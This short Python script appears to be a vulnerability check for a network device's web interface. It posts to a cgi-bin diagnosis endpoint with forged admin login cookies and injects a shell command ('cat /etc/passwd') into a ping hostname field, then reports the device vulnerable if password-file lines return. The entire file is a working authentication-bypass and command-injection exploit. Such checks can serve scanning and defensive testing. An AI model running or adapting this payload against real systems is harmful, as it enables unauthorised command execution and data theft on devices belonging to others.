import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1"
	body="call_function=ping&iface=eth0&hostname=%3Becho%20123%3Bcat%20/etc/passwd"
	headers={'cookie': 'cooUser=admin; timestamp=-6; cooLogin=1', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("root:[^:]*:[0-9]*:[0-9]*:[^:]*",response.text):
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
